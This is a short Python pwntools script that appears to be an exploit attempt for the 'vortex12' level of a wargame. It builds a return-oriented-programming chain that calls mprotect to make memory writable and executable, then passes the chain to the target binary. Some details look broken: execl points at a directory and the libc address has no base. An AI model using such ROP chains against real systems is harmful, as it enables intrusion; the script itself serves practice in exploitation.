#!/usr/bin/python3
from pwn import *
import sys
import os

elf = ELF('./vortex12')
libc = elf.libc

mprotect = elf.libc.symbols['mprotect']


rop = ROP(elf)

context.binary = elf

def gen_rop():
    rop.call(mprotect, [elf.got, 5678, 7])
    return rop

def main():
    rop = gen_rop()
    os.execl('/vortex/vortex12/', rop.chain())

if __name__ == '__main__':
    main()
